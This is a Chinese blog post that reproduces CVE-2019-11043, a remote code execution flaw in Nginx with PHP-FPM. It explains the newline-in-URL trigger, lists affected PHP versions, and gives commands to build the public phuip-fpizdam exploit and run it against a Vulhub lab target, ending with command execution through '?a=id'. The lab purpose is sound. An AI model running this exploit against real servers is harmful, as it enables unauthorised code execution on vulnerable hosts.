# PHP 远程代码执行漏洞复现（CVE-2019-11043） - 小菜鸟当黑客 - 博客园

> 原文：[`www.cnblogs.com/bflw/p/12708046.html`](https://www.cnblogs.com/bflw/p/12708046.html)

### **漏洞描述**

CVE-2019-11043 是一个远程代码执行漏洞，使用某些特定配置的 Nginx + PHP-FPM 的服务器存在漏洞，可允许攻击者远程执行代码。

向 Nginx + PHP-FPM 的服务器 URL 发送 %0a 时，服务器返回异常。

攻击者可以使用换行符（％0a）来破坏`fastcgi_split_path_info`指令中的 Regexp。Regexp 被损坏导致 PATH_INFO 为空，从而触发该漏洞。

### **影响范围**

在 Nginx + PHP-FPM 环境下，当启用了上述 Nginx 配置后，以下 PHP 版本受本次漏洞影响，

另外，PHP 5.6 版本也受此漏洞影响，但目前只能 Crash，不可以远程代码执行：

*   PHP 7.0 版本
*   PHP 7.1 版本
*   PHP 7.2 版本
*   PHP 7.3 版本

### 漏洞环境：

攻击机：

kali

需要安装:

Go 环境

安装：

sudo apt-get install docker docker-compose

sudo apt install golang

工具：

git clone https://github.com/neex/phuip-fpizdam.git

cd phuip-fpizdam

go get -v && go build

使用：

 cd phuip-fpizdam/

 ./phuip-fpizdam/

 go run . [`ip:8080/index.php`](http://ip:8080/index.php)

靶机：

ubantu

靶场：

Vulhub

安装：

git clone https://github.com/vulhub/vulhub.git

cd vulhub/php/CVE-2019-11043 && docker-compose up -d

### 漏洞复现：

启动环境之后，就可以看到漏洞环境的默认页面。在此为 [`ip:8080/index.php`](http://ip:8080/index.php)。

![](img/b72e3027e43f7c158eef59a425a70ef0.png)

上边工具安装完成之后，run 一下

然后访问

http://192.168.123.190:8080/index.php?a=id

![](img/7ddcf9eb2c784ce4e2f3079e64f1b7c6.png)

此次复现成功。

### 企鹅群：1045867209

### 欢迎各位表哥

### 博主公众号

![](img/c6c1a4b057b858c88387a767f55d83a4.png)

本文欢迎转载。 如转载请务必注明出处。 觉得写的不错的可以右侧打赏一手。 群在上边欢迎大家来撩。